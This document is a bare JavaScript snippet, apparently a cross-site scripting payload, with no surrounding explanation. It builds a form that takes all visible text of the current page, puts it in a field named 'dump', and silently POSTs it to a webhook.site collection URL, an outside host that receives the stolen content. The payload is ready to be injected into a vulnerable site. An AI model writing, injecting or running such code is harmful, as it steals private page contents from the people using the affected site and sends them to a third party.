let f = document.createElement('form');
f.action = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c';
f.method = 'POST';
let i = document.createElement('input');
i.name = 'dump';
i.value = document.body.innerText;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
